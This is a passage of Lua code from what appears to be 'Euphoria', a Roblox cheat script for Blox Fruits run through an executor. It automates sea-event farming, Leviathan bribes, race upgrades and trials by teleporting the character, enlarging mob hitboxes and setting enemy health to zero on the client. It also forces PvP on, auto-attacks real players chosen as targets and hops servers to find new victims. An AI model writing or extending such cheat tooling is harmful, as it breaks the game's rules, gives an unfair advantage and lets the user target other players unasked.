                                        for _,cTool in pairs(LP.Backpack:GetChildren()) do
                                            canUseThis = false
                                            if cTool.Name == "Buddha-Buddha" or cTool.Name == "Portal-Portal" or cTool.Name == "Control-Control" then
                                                local skipFruitShit = 0
                                            else
                                                for _,x in AvailableTools do
                                                    if cTool.ToolTip == x then
                                                        canUseThis = true
                                                    end
                                                end
                                                if canUseThis then
                                                    LP.Character.Humanoid:EquipTool(cTool)
                                                    wait(.01)
                                                    AttackSkill(_G.SeaEventTarget, nil)
                                                end
                                            end
                                        end
                                    else
                                        toTarget(CFrame.new(_G.SeaEventTarget.VehicleSeat.CFrame.X, 10, _G.SeaEventTarget.VehicleSeat.CFrame.Z))
                                    end
                                until not _G.AutoSharkAnchor or not _G.SeaEventTarget or not _G.SeaEventTarget.Parent or _G.SeaEventTarget.Health.Value <= 0 
                            end
                        end
                    end)
                end
            end)
            
            spawn(function()
                while wait() do
                    pcall(function()
                        if _G.AutoSharkAnchor or getgenv().EuphoriaSettings["Remove Fog"] then
                            if game:GetService("Lighting").LightingLayers:FindFirstChild("DarkFog") then
                                game:GetService("Lighting").LightingLayers:FindFirstChild("DarkFog"):Destroy()
                            end
                        end
                    end)
                end
            end)
            spawn(function()
                while wait() do
                    pcall(function()
                        if _G.AutoSharkAnchor and _G.SeaEventAttackBoat then
                            _G.AimbotPos = _G.SeaEventTarget.VehicleSeat.CFrame
                            toPoint(_G.SeaEventTarget.VehicleSeat.CFrame * CFrame.new(0,20,0))
                        end
                    end)
                end
            end)

            
            spawn(function()
                while wait() do
                    pcall(function()
                        if _G.AutoSharkAnchor and _G.AttackSeaEvent and _G.SeaEventTarget then
                            if _G.SeaEventTarget.Name == "Terrorshark" then
                                if _G.SeaEventDodgeTimer == false then
                                    wait(2.5)
                                    _G.SeaEventDodgeTimer = true
                                else
                                    wait(2.8)
                                    _G.SeaEventDodgeTimer = false
                                end
                            else
                                _G.SeaEventDodgeTimer = false
                            end
                        end
                    end)
                end
            end)
            spawn(function()
                while wait() do
                    pcall(function()
                        if _G.AutoSharkAnchor and _G.AttackSeaEvent then
                            if not _G.SeaEventImmuneToPhys then
                                if _G.SeaEventTarget.Name == "Terrorshark" then
                                    if _G.SeaEventDodgeTimer then
                                        _G.SeaEventDodgeState = 1
                                    elseif _G.SeaEventTarget.HumanoidRootPart.BodyPosition.Position.Y > 5 then
                                        _G.SeaEventDodgeState = 1
                                        wait(2)
                                    else
                                        _G.SeaEventDodgeState = 0
                                    end
                                else
                                    _G.SeaEventDodgeState = 0
                                end
                            end
                        end
                    end)
                end
            end)
            local LeviathanFarm = SeaEventTab:NewSection("Leviathan")
            BribeLabel = LeviathanFarm:NewLabel("Bribe: ")
            BribeLevel = 0
            spawn(function()
                while wait() do
                    pcall(function()
                        BribeLevel = game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("InfoLeviathan","1")
                        wait(10)
                    end)
                end
            end)
            spawn(function()
                while wait() do
                    pcall(function()
                        if BribeLevel == -1 then
                            BribeLabel:UpdateLabel("Bribe: Complete 20 sea events ❌")
                        else
                            BribeLabel:UpdateLabel("Bribe: " .. tostring(BribeLevel) .. '/5')
                        end
                    end)
                end
            end)        

            AutoFindFrozenDimensionToggle = LeviathanFarm:NewToggle("Auto Find Frozen Dimension", function(state)
                getgenv().EuphoriaSettings["Auto Find Frozen Dimension"] = state
                stopBoat()
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Auto Find Frozen Dimension"] then AutoFindFrozenDimensionToggle:UpdateToggle(nil, true) end
            dimensionWebhookSended = false
            lockFindFrozenDimension = false
            spawn(function()
                while wait() do
                    pcall(function()
                        if third_sea and getgenv().EuphoriaSettings["Auto Find Frozen Dimension"] then
                            AutoFindFrozenDimension = true
                        else
                            AutoFindFrozenDimension = false
                            BoatingFrozenDimension = false
                        end
                    end)
                end
            end)
            spawn(function()
                while wait() do
                    pcall(function()
                        if third_sea and AutoFindFrozenDimension and BribeLevel == 5 then
                            if game:GetService("Workspace").Map:FindFirstChild("LeviathanGate") then
                                lockFindFrozenDimension = true
                                if not dimensionWebhookSended then
                                    local Embed = {
                                        ["title"] = LP.Name,
                                        ["description"] = "```py\nFROZEN DIMENSION FOUND```",
                                        ["type"] = "rich",
                                        ["color"] = tonumber(0xffffff),
                                        ["footer"] = {
                                            ["text"] = "e u p h o r i a =3",
                                        }
                                    };
                                    sendWebhook(
                                        webhook['misc_webhook'],
                                        "@here",
                                        Embed 
                                    )
                                    wait()
                                    sendWebhook(
                                        webhook['misc_webhook'],
                                        "@here",
                                        Embed 
                                    )
                                    wait()
                                    sendWebhook(
                                        webhook['misc_webhook'],
                                        "@here",
                                        Embed 
                                    )
                                    dimensionWebhookSended = true
                                end
                                BoatingFrozenDimension = false
                                dismountBoat()
                                stopBoat()
                            else
                                if not lockFindFrozenDimension then
                                    BoatingFrozenDimension = true
                                end
                            end
                        end
                    end)
                end
            end)

            spawn(function()
                while wait() do
                    local sa, ea = pcall(function()
                        if third_sea and BoatingFrozenDimension then
                            BoatPos = CFrame.new(-16208.5752, 9.08636189, 407.685608, 0.87449646, 1.22196955e-08, -0.485031873, 2.7691156e-08, 1, 7.51198357e-08, 0.485031873, -7.91231187e-08, 0.87449646)
                            TikiPos = CFrame.new(-16207.3916, 9.08636189, 442.4935, -0.289960057, 1.5374928e-09, -0.95703876, 1.00728599e-07, 1, -2.89118667e-08, 0.95703876, -1.04784462e-07, -0.289960057)
                            
                            SeaDanger5BringPos = CFrame.new(-38409.1055, 3.35565066, 3538.43701, -0.064785257, 1.32857552e-15, 0.997899234, -1.73704636e-15, 1, -1.44414438e-15, -0.997899234, -1.82695647e-15, -0.064785257)
                            SeaDanger5Waypoints = {
                                CFrame.new(-66317.9414, 19.3556461, 7825.96094, -0.99994415, 3.02188639e-08, 0.0105693713, 3.11131103e-08, 1, 8.44431085e-08, -0.0105693713, 8.47672368e-08, -0.99994415),
                                CFrame.new(-66529.7871, 16.279829, 6990.2041, 0.69260025, 3.93635951e-08, -0.721321642, 7.52798925e-08, 1, 1.26853905e-07, 0.721321642, -1.42160062e-07, 0.69260025),
                                CFrame.new(-66814.1289, 19.3556461, 4124.68164, 0.730453014, -1.21849226e-07, 0.682962954, 6.75700704e-08, 1, 1.06144078e-07, -0.682962954, -3.13854081e-08, 0.730453014),
                                CFrame.new(-66540.2148, 19.0456848, 382.093201, 0.964051366, -4.15628776e-08, 0.265715957, 4.25003499e-08, 1, 2.22175878e-09, -0.265715957, 9.1511323e-09, 0.964051366),
                                CFrame.new(-68969.0781, 19.3556461, -3201.8501, 0.994422197, -1.66379905e-08, 0.105472721, 1.0503582e-08, 1, 5.87165694e-08, -0.105472721, -5.72812198e-08, 0.994422197),
                                CFrame.new(-68257.082, 19.3556461, -6701.3335, 0.98023206, -6.88214019e-09, -0.197851136, -8.92395136e-09, 1, -7.89971892e-08, 0.197851136, 7.92011932e-08, 0.98023206),
                                CFrame.new(-68532.4609, 19.3556461, -8530.47754, 0.76733923, -2.11108464e-09, 0.641241431, 4.2145083e-09, 1, -1.75109216e-09, -0.641241431, 4.04619893e-09, 0.76733923),
                                CFrame.new(-68567.7969, 19.3556461, -5447.55273, -0.982734621, -2.79101684e-08, 0.185020611, -2.580847e-08, 1, 1.37676075e-08, -0.185020611, 8.75480666e-09, -0.982734621),
                                CFrame.new(-68563.875, 19.3556461, -2665.32642, -0.956179023, -5.25171684e-09, -0.292782545, -1.50302402e-08, 1, 3.11489998e-08, 0.292782545, 3.41846125e-08, -0.956179023)
                            }
                            
                            if not getMyBoat() then
                                if getDistance(BoatPos) > 20 then
                                    if useNearestEntrance(BoatPos) then
                                        StopTween()
                                    end
                                    toPoint(BoatPos)
                                else
                                    buyBoat()
                                end
                            else
                                if getDistanceBoat(TikiPos) < 100 then
                                    bringBoat(CFrame.new(-17735.1484, -0.285292208, 794.151611, 0.669047594, 0, -0.743219554, 0, 1, 0, 0.743219554, 0, 0.669047594))
                                end
                                if BoatingFrozenDimension and not isOnBoat() then
                                    toBoat()
                                end
                                if isOnBoat() then
                                    if not SeaDanger5WaypointIndex or SeaDanger5WaypointIndex > #SeaDanger5Waypoints then
                                        SeaDanger5WaypointIndex = 1
                                    end
                                    if getDistanceBoat(SeaDanger5Waypoints[SeaDanger5WaypointIndex]) < 100 then
                                        SeaDanger5WaypointIndex = SeaDanger5WaypointIndex + 1
                                    else
                                        tweenBoat(SeaDanger5Waypoints[SeaDanger5WaypointIndex])
                                    end
                                end
                            end
                        end
                    end)
                    if ea then print(ea) end
                end
            end)
            AutoBribeToggle = LeviathanFarm:NewToggle("Auto Bribe", function(state)
                getgenv().EuphoriaSettings["Auto Bribe"] = state
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Auto Bribe"] then AutoBribeToggle:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if third_sea and getgenv().EuphoriaSettings["Auto Bribe"] and BribeLevel < 5 then
                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("InfoLeviathan","2")
                        end
                        wait(5)
                    end)
                end
            end)
            FollowPlayerBoatToggle = LeviathanFarm:NewToggle("Follow Player Boat", function(state)
                getgenv().EuphoriaSettings["Follow Player Boat"] = state
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Follow Player Boat"] then FollowPlayerBoatToggle:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if third_sea and getgenv().EuphoriaSettings["Follow Player Boat"] then
                            FollowPlayerBoat = true
                        else
                            FollowPlayerBoat = false
                        end
                    end)
                end
            end)
            spawn(function()
                while wait() do
                    pcall(function()
                        if third_sea and FollowPlayerBoat then
                            if PlayerBoatName then
                                if getPlayerBoat(PlayerBoatName) then
                                    toPlayerBoat(PlayerBoatName)
                                else
                                    PlNameOld = PlayerBoatName
                                    repeat wait()
                                        
                                    until getPlayerBoat(PlayerBoatName) or PlNameOld ~= PlayerBoatName or not FollowPlayerBoat
                                    wait(2)
                                end
                            end
                        end
                    end)
                end
            end)
            players = {}
            for i,v in pairs(game.Players:GetChildren()) do
                table.insert(players, v.Name)
            end
            PlayerBoatName = nil
            SelectPlayerDropdown = LeviathanFarm:NewDropdown("Select Player", players, function(choice)
                getgenv().EuphoriaSettings["Select Player Boat"] = choice
                PlayerBoatName = choice
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Select Player Boat"] then 
                SelectPlayerDropdown:UpdateSelect(getgenv().EuphoriaSettings["Select Player Boat"]) 
                PlayerBoatName = getgenv().EuphoriaSettings["Select Player Boat"]
            end
            RefreshPlayerListButton = LeviathanFarm:NewButton("Refresh Player List", function()
                players = {}
                for i,v in pairs(game.Players:GetChildren()) do
                    table.insert(players, v.Name)
                end
                SelectPlayerDropdown:Refresh(players)
            end)
        end

        function getNearestSeaBeast()
            local dst = math.huge
            local tar = nil
            if #workspace.SeaBeasts:GetChildren() > 0 then
                for i,v in pairs(workspace.SeaBeasts:GetChildren()) do
                    if getDistance(v:WaitForChild("HumanoidRootPart").CFrame) < dst then
                        dst = getDistance(v.HumanoidRootPart.CFrame)
                        tar = v
                    end
                end
                return tar
            else
                return nil
            end
        end

        function CheckAncientOneStatus()
            if not LP.Character:FindFirstChild("RaceTransformed") then
                return "You have yet to achieve greatness"
            end
            local v227 = nil
            local v228 = nil
            local v229 = nil
            v229, v228, v227 = game.ReplicatedStorage.Remotes.CommF_:InvokeServer("UpgradeRace", "Check")
            if v229 == 1 then
                return "Required Train More"
            elseif v229 == 2 or v229 == 4 or v229 == 7 then
                return "Can Buy Gear With " .. v227 .. " Fragments"
            elseif v229 == 3 then
                return "Required Train More"
            elseif v229 == 5 then
                return "You Are Done Your Race."
            elseif v229 == 6 then
                return "Upgrades completed: " .. v228 - 2 .. "/3, Need Trains More"
            end
            if v229 ~= 8 then
                if v229 == 0 then
                    return "Ready For Trial"
                else
                    return "You have yet to achieve greatness"
                end
            end
            return "Remaining " .. 10 - v228 .. " training sessions."
        end

        local RaceTab = Window:NewTab("Race")
        if second_sea then
            RaceSection = RaceTab:NewSection("Race")
            AutoV2Race = RaceSection:NewToggle("Auto Race V2", function(state)
                getgenv().EuphoriaSettings["Auto Race V2"] = state
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Auto Race V2"] then AutoV2Race:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().EuphoriaSettings["Auto Race V2"] then _G.AutoV2Race = true else _G.AutoV2Race = false end
                    end)
                end
            end)
            spawn(function()
                pcall(function()
                    while wait(.1) do
                        if _G.AutoV2Race then
                            if not game:GetService("Players").LocalPlayer.Data.Race:FindFirstChild("Evolved") then
                                if game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("Alchemist","1") == 0 then
                                    if useNearestEntrance(CFrame.new(-2779.83521, 72.9661407, -3574.02002, -0.730484903, 6.39014104e-08, -0.68292886, 3.59963224e-08, 1, 5.50667032e-08, 0.68292886, 1.56424669e-08, -0.730484903)) then
                                        StopTween()
                                    end
                                    toPoint(CFrame.new(-2779.83521, 72.9661407, -3574.02002, -0.730484903, 6.39014104e-08, -0.68292886, 3.59963224e-08, 1, 5.50667032e-08, 0.68292886, 1.56424669e-08, -0.730484903))
                                    if (Vector3.new(-2779.83521, 72.9661407, -3574.02002) - game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 4 then
                                        wait(1.3)
                                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("Alchemist","2")
                                    end
                                elseif game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("Alchemist","1") == 1 then
                                    pcall(function()
                                        if not game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Flower 1") and not game:GetService("Players").LocalPlayer.Character:FindFirstChild("Flower 1") then
                                            if useNearestEntrance(game:GetService("Workspace").Flower1.CFrame) then
                                                StopTween()
                                            end
                                            toPoint(game:GetService("Workspace").Flower1.CFrame)
                                        elseif not game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Flower 2") and not game:GetService("Players").LocalPlayer.Character:FindFirstChild("Flower 2") then
                                            if useNearestEntrance(game:GetService("Workspace").Flower2.CFrame) then
                                                StopTween()
                                            end
                                            toPoint(game:GetService("Workspace").Flower2.CFrame)
                                        elseif not game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Flower 3") and not game:GetService("Players").LocalPlayer.Character:FindFirstChild("Flower 3") then
                                            if game:GetService("Workspace").Enemies:FindFirstChild("Zombie") then
                                                for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                                                    if v.Name == "Zombie" then
                                                        repeat task.wait()
                                                            BringMobFarm = true
                                                            EquipWeapon(_G.SelectWeapon)
                                                            if useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame()) then
                                                                StopTween()
                                                            end
                                                            toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                                            v.HumanoidRootPart.CanCollide = false
                                                            v.HumanoidRootPart.Size = Vector3.new(50,50,50)
                                                            PosMon = v.HumanoidRootPart.CFrame
                                                        until game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Flower 3") or not v.Parent or v.Humanoid.Health <= 0 or _G.Auto_EvoRace == false
                                                        BringMobFarm = false
                                                    end
                                                end
                                            else
                                                toPoint(CFrame.new(-5685.9233398438, 48.480125427246, -853.23724365234))
                                            end
                                        end
                                    end)
                                elseif game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("Alchemist","1") == 2 then
                                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("Alchemist","3")
                                end
                            end
                        end
                    end
                end)
            end)

            AutoV3RaceToggle = RaceSection:NewToggle("Auto Race V3", function(state)
                getgenv().EuphoriaSettings["Auto Race V3"] = state
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Auto Race V3"] then AutoV3RaceToggle:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().EuphoriaSettings["Auto Race V3"] and PlayerData.RaceVer == "V2" then AutoV3Race = true else AutoV3Race = false end
                    end)
                end
            end)

            spawn(function()
                while wait() do
                    local s,e = pcall(function()
                        if AutoV3Race then
                            if PlayerData.RaceVer == "V2" then
                                GetQuestV3()
                                local raceName = LP.Data.Race.Value
                                if raceName == "Human" then
                                    BuyV3Race()
                                    BossQuest = {
                                        ["Diamond"] = isNPCAlive("Diamond"),
                                        ["Fajita"] = isNPCAlive("Fajita"),
                                        ["Jeremy"] = isNPCAlive("Jeremy")
                                    }
                                    
                                    sk = {}
                                    for r,v in pairs(BossQuest) do
                                        if v then
                                            table.insert(sk, r)
                                        end
                                    end
                                    if #sk < 3 then
                                        notis.new("Hop server for find all three bosses"):Display()
                                        task.wait(1)
                                        HopServer()
                                    end
                                    if #sk == 3 then
                                        for bossName, status in pairs(BossQuest) do
                                            local t = getClosest({bossName})
                                            if t then
                                                repeat wait()
                                                    BuyV3Race()
                                                    EquipWeapon(_G.SelectWeapon)
                                                    useNearestEntrance(t.HumanoidRootPart.CFrame * OffsetCFrame())
                                                    toTarget(t.HumanoidRootPart.CFrame * OffsetCFrame())
                                                    t.Humanoid.WalkSpeed = 0
                                                    t.HumanoidRootPart.Size = Vector3.new(50,50,50)
                                                    t.Humanoid:ChangeState(14)
                                                    t.HumanoidRootPart.CanCollide = false
                                                    t.Head.CanCollide = false
                                                    BringMobFarm = false
                                                    MonName = t.Name
                                                    PosMon = t.HumanoidRootPart.CFrame
                                                until not AutoV3Race or not t or not t.Parent or not t:FindFirstChild("Humanoid") or t:FindFirstChild("Humanoid").Health <= 0
                                                BuyV3Race()
                                            end
                                        end
                                    end
                                elseif raceName == "Skypiea" then
                                    angelTarget = nil
                                    for i,v in pairs(game.Players:GetChildren()) do
                                        if v.Name ~= LP.Name and not isInSkipTarget(v.Name) and not v:GetAttribute("IslandRaiding") then
                                            if v.Data.Race.Value == raceName then
                                                local lvlDiff = v.Data.Level.Value - LP.Data.Level.Value
                                                if lvlDiff < 500 and lvlDiff > -500 then
                                                    if LP.Team.Name == "Marines" then
                                                        if v.Team.Name ~= "Marines" and not v.Neutral then
                                                            angelTarget = v
                                                        end
                                                    else
                                                        angelTarget = v
                                                    end
                                                end
                                            end
                                        end
                                    end
                                    if angelTarget then
                                        repeat wait()
                                            if LP.PlayerGui.Main.PvpDisabled.Visible == true then
                                                ReplicatedStorage.Remotes.CommF_:InvokeServer("EnablePvp")
                                            end
                                            if useNearestEntrance(angelTarget.Character.HumanoidRootPart.CFrame) then
                                                StopTween()
                                            end
                                            spawn(function()
                                                if not _G.FollowTargetAngel then
                                                    _G.FollowTargetAngel = true
                                                    repeat wait()
                                                        followTarget(angelTarget.Character.HumanoidRootPart.CFrame)
                                                    until not AutoV3Race or PlayerData.RaceVer == "V3" or not angelTarget or not angelTarget.Parent or angelTarget.Character.Humanoid.Health <= 0 or isInSkipTarget(angelTarget)
                                                    _G.FollowTargetAngel = false
                                                end
                                            end)
                                            if getDistance(angelTarget.Character.HumanoidRootPart.CFrame) < 100 then
                                                AvailableTools = {}
                                                if LP.Data.Stats.Melee.Level.Value > 500 then
                                                    table.insert(AvailableTools, "Melee")
                                                end
                                                if LP.Data.Stats["Demon Fruit"].Level.Value > 500 then  
                                                    table.insert(AvailableTools, "Blox Fruit")
                                                end
                                                if LP.Data.Stats.Sword.Level.Value > 500 then
                                                    table.insert(AvailableTools, "Sword")
                                                end
                                                if LP.Data.Stats.Gun.Level.Value > 500 then
                                                    table.insert(AvailableTools, "Gun")
                                                end
                                                for _,cTool in pairs(LP.Backpack:GetChildren()) do
                                                    canUseThis = false
                                                    if cTool.Name == "Buddha-Buddha" or cTool.Name == "Portal-Portal" or cTool.Name == "Control-Control" then
                                                        local skipFruitShit = 0
                                                    else
                                                        for _,x in AvailableTools do
                                                            if cTool.ToolTip == x then
                                                                canUseThis = true
                                                            end
                                                        end
                                                        if canUseThis then
                                                            LP.Character.Humanoid:EquipTool(cTool)
                                                            wait(.01)
                                                            AttackSkill(angelTarget, nil)
                                                        end
                                                        spawn(function()
                                                            if not _G.SkipTargetSkypieaActive then
                                                                _G.SkipTargetSkypieaActive = true
                                                                repeat wait()
                                                                    if LP.PlayerGui.Main.PvpDisabled.Visible == true then
                                                                        ReplicatedStorage.Remotes.CommF_:InvokeServer("EnablePvp")
                                                                    end
                                                                    if angelTarget and getDistance(angelTarget.Character.HumanoidRootPart.CFrame) < 100 then
                                                                        wait(15)
                                                                        if angelTarget.Character.Humanoid.Health >= angelTarget.Character.Humanoid.MaxHealth * 0.95 then
                                                                            table.insert(skipTargets, angelTarget.Name)
                                                                            angelTarget = nil
                                                                            notis.new("Switch target"):Display()
                                                                        end
                                                                    end
                                                                until not AutoV3Race or PlayerData.RaceVer == "V3" or not angelTarget or not angelTarget.Parent or angelTarget.Character.Humanoid.Health <= 0 or isInSkipTarget(angelTarget)
                                                                _G.SkipTargetSkypieaActive = false
                                                            end
                                                        end)
                                                    end
                                                    
                                                end
                                                BuyV3Race()
                                            end
                                            BuyV3Race()
                                        until not AutoV3Race or PlayerData.RaceVer == "V3" or not angelTarget or not angelTarget.Parent or angelTarget.Character.Humanoid.Health <= 0
                                        BuyV3Race()
                                    else
                                        notis.new("No angel target, hop server"):Display()
                                        HopServer()
                                    end
                                elseif raceName == "Ghoul" then
                                    BuyV3Race()
                                    AutoRaceGhoul = true
                                elseif raceName == "Fishman" then
                                    BuyV3Race()
                                    AutoRaceShark = true
                                elseif raceName == "Cyborg" then
                                    local cheapest = getCheapestFruit()
                                    if cheapest then
                                        ReplicatedStorage.Remotes.CommF_:InvokeServer("LoadFruit", cheapest)
                                        BuyV3Race()
                                    end
                                elseif raceName == "Mink" then
                                    local Chest = workspace:FindFirstChild("Chest4") or workspace:FindFirstChild("Chest3") or workspace:FindFirstChild("Chest2") or workspace:FindFirstChild("Chest1") or workspace:FindFirstChild("Chest")
                                    if Chest then
                                        repeat wait()
                                            BuyV3Race()
                                            if useNearestEntrance(Chest:GetPivot()) then
                                                StopTween()
                                            end
                                            followTarget(Chest:GetPivot())
                                        until not AutoV3Race or not Chest or not Chest.Parent
                                    else
                                        if AutoV3Race then
                                            BuyV3Race()
                                        end
                                    end
                                end
                            else
                                AutoRaceShark = false
                                AutoRaceGhoul = false
                            end
                        else
                            AutoRaceGhoul = false
                            AutoRaceShark = false
                        end
                    end)
                    if e then print(e) end
                end         
            end)
            spawn(function()
                while wait() do
                    pcall(function()
                        if AutoRaceShark then
                            AutoSeaBeastRaceV3 = true
                            BuyV3Race()
                        else
                            AutoSeaBeastRaceV3 = false
                        end
                    end)
                end
            end)
            ghoulTarget = nil
            spawn(function()
                while wait() do
                    local s,e = pcall(function()
                        if AutoRaceGhoul then
                            if not ghoulTarget then
                                for i,v in pairs(game.Players:GetChildren()) do
                                    if v.Name ~= LP.Name and not v:GetAttribute("IslandRaiding") and not v.Neutral and not isInSkipTarget(v.Name) then
                                        local lvlDiff = v.Data.Level.Value - LP.Data.Level.Value
                                        if lvlDiff < 500 and lvlDiff > -500 then
                                            if LP.Team and LP.Team.Name == "Marines" then
                                                if v.Team.Name ~= "Marines" then
                                                    ghoulTarget = v
                                                    break
                                                end
                                            else
                                                ghoulTarget = v
                                                break
                                            end
                                        end
                                    end
                                end
                                if not ghoulTarget then
                                    skipTargets = {}
                                end
                                for i,v in pairs(game.Players:GetChildren()) do
                                    if v.Name ~= LP.Name and not v:GetAttribute("IslandRaiding") and not v.Neutral and not isInSkipTarget(v.Name) then
                                        local lvlDiff = v.Data.Level.Value - LP.Data.Level.Value
                                        if lvlDiff < 500 and lvlDiff > -500 then
                                            if LP.Team and LP.Team.Name == "Marines" then
                                                if v.Team.Name ~= "Marines" then
                                                    ghoulTarget = v
                                                    break
                                                end
                                            else
                                                ghoulTarget = v
                                                break
                                            end
                                        end
                                    end
                                end
                                if not ghoulTarget then
                                    notis.new("No targets"):Display()
                                    HopServer()
                                end
                            else
                                if ghoulTarget.Character.Humanoid.Health <= 0 then
                                    ghoulTarget = nil
                                end
                            end
                        end
                    end)
                    if e then print(e, 'find target') end
                end
            end)

            spawn(function()
                while wait() do
                    local s,e = pcall(function()
                        if AutoRaceGhoul then   
                            if LP.PlayerGui.Main.PvpDisabled.Visible == true then
                                ReplicatedStorage.Remotes.CommF_:InvokeServer("EnablePvp")
                            end
                            if ghoulTarget and getDistance(ghoulTarget.Character.HumanoidRootPart.CFrame) < 100 then
                                wait(15)
                                if ghoulTarget and ghoulTarget.Character.Humanoid.Health >= ghoulTarget.Character.Humanoid.MaxHealth * 0.95 then
                                    table.insert(skipTargets, ghoulTarget.Name)
                                    ghoulTarget = nil
                                    notis.new("Switch target"):Display()
                                end
                            end
                        end
                    end)
                    if e then print(e, 'check target') end
                end
            end)
            spawn(function()
                while wait() do
                    local s,e = pcall(function()
                        if AutoRaceGhoul then   
                            if ghoulTarget and ghoulTarget:FindFirstChild("Character") and ghoulTarget.Character:FindFirstChild("HumanoidRootPart") then
                                followTarget(ghoulTarget.Character.HumanoidRootPart.CFrame)
                            end
                        end
                    end)
                    if e then print(e, 'follow target') end
                end
            end)
            spawn(function()
                while wait() do
                    local s,e = pcall(function()
                        if AutoRaceGhoul then   
                            if ghoulTarget then
                                repeat wait()
                                    if LP.PlayerGui.Main.PvpDisabled.Visible == true then
                                        ReplicatedStorage.Remotes.CommF_:InvokeServer("EnablePvp")
                                    end
                                    if useNearestEntrance(ghoulTarget.Character.HumanoidRootPart.CFrame) then
                                        StopTween()
                                    end
                                    if getDistance(ghoulTarget.Character.HumanoidRootPart.CFrame) < 100 then
                                        AvailableTools = {}
                                        if LP.Data.Stats.Melee.Level.Value > 500 then
                                            table.insert(AvailableTools, "Melee")
                                        end
                                        if LP.Data.Stats["Demon Fruit"].Level.Value > 500 then  
                                            table.insert(AvailableTools, "Blox Fruit")
                                        end
                                        if LP.Data.Stats.Sword.Level.Value > 500 then
                                            table.insert(AvailableTools, "Sword")
                                        end
                                        if LP.Data.Stats.Gun.Level.Value > 500 then
                                            table.insert(AvailableTools, "Gun")
                                        end
                                        for _,cTool in pairs(LP.Backpack:GetChildren()) do
                                            canUseThis = false
                                            if cTool.Name == "Buddha-Buddha" or cTool.Name == "Portal-Portal" or cTool.Name == "Control-Control" then
                                                local skipFruitShit = 0
                                            else
                                                for _,x in AvailableTools do
                                                    if cTool.ToolTip == x then
                                                        canUseThis = true
                                                    end
                                                end
                                                if canUseThis then
                                                    LP.Character.Humanoid:EquipTool(cTool)
                                                    wait(.01)
                                                    AttackSkill(ghoulTarget, nil)
                                                end
                                            end
                                        end
                                        BuyV3Race()
                                    end
                                    BuyV3Race()
                                until not AutoV3Race or PlayerData.RaceVer == "V3" or not ghoulTarget or not ghoulTarget.Parent or ghoulTarget.Character.Humanoid.Health <= 0
                                BuyV3Race()
                            end
                        end
                    end)
                    if e then print(e, 'kill target') end
                end
            end)
        end
        if third_sea then
            local RaceV4Section = RaceTab:NewSection("Race V4")
            RaceV4Section:NewButton("Teleport to Temple of Time", function()
                ReplicatedStorage.Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(28282.5703125, 14896.8505859375, 105.1042709350586))
            end)

            RaceV4Section:NewButton("Teleport to Trial Door", function()
                if not PlayerData.BlueGear then
                    notis.new("<Color=Red>You dont have Blue Gear!!!<Color=/>"):Display()
                    return
                end
                if getDistance(CFrame.new(28282.5703125, 14896.8505859375, 105.1042709350586)) > 3000 then
                    ReplicatedStorage.Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(28282.5703125, 14896.8505859375, 105.1042709350586))
                end
                if workspace.Map["Temple of Time"].Lever.Prompt:FindFirstChild("ProximityPrompt") then
                    fireproximityprompt(workspace.Map["Temple of Time"].Lever.Prompt.ProximityPrompt)
                    wait(1)
                    if not workspace.Map["Temple of Time"].Lever.Prompt:FindFirstChild("ProximityPrompt") then
                        notis.new("<Color=Green>Lever activated!<Color=/>"):Display()
                    end
                end
                if LP.Character.Humanoid.Health <= 0 then return end
                if LP.Data.Race.Value == "Fishman" then
                    toPoint(CFrame.new(28224.056640625, 14889.4267578125, -210.5872039794922))
                elseif LP.Data.Race.Value == "Human" then
                    toPoint(CFrame.new(29237.294921875, 14889.4267578125, -206.94955444335938))
                elseif LP.Data.Race.Value == "Cyborg" then
                    toPoint(CFrame.new(28492.4140625, 14894.4267578125, -422.1100158691406))
                elseif LP.Data.Race.Value == "Skypiea" then
                    toPoint(CFrame.new(28967.408203125, 14918.0751953125, 234.31198120117188))
                elseif LP.Data.Race.Value == "Ghoul" then
                    toPoint(CFrame.new(28672.720703125, 14889.1279296875, 454.5961608886719))
                elseif LP.Data.Race.Value == "Mink" then
                    toPoint(CFrame.new(29020.66015625, 14889.4267578125, -379.2682800292969))
                end
            end)
            
            AutoTrial = RaceV4Section:NewToggle("Auto Trial", function(state)
                getgenv().EuphoriaSettings["Auto Trial"] = state
                WriteSettings()
            end)
            spawn(function()
                pcall(function()
                    while wait() do
                        if getgenv().EuphoriaSettings["Auto Trial"] then _G.AutoTrial = true else _G.AutoTrial = false end
                    end
                end)
            end)
            if getgenv().EuphoriaSettings["Auto Trial"] then AutoTrial:UpdateToggle(nil, true) end

            spawn(function()
                pcall(function()
                    while wait() do
                        if _G.AutoTrial and LP.PlayerGui.Main.Timer.Visible == true then
                            _G.GoingTrial = true
                            if LP.Data.Race.Value == "Human" then
                                for i,v in pairs(game.Workspace.Enemies:GetDescendants()) do
                                    if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                                        pcall(function()
                                            repeat wait(.1)
                                                v.Humanoid.Health = 0
                                                v.HumanoidRootPart.CanCollide = false
